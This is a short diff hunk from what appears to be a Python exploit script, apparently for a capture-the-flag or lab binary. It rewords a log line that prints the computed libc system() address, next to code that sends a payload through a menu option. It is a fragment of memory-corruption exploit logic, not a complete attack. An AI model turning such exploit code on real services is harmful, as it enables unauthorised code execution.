@@ -124,7 +124,7 @@ if __name__ == "__main__":
 
   # Compute the system address
   system_address = libc.symbols['system']
-  log.info("System address: " + hex(system_address))
+  log.info("Computed system() address: " + hex(system_address))
 
   # Remove the account with our payload
   x.sendline('1')
